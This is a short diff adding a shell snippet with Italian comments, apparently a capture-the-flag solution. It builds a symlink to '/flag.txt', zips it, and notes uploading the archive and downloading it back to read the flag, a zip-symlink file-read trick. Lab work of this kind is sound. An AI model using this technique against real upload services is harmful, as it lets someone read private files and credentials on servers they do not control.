@@ -1,0 +1,5 @@
+# Bisogna creare un symlink alla flag '/flag.txt' e comprimerlo
+ln -s /flag.txt flag
+zip zipped-flag flag
+
+# Inviare e scaricare lo zip contenente il file con la flag
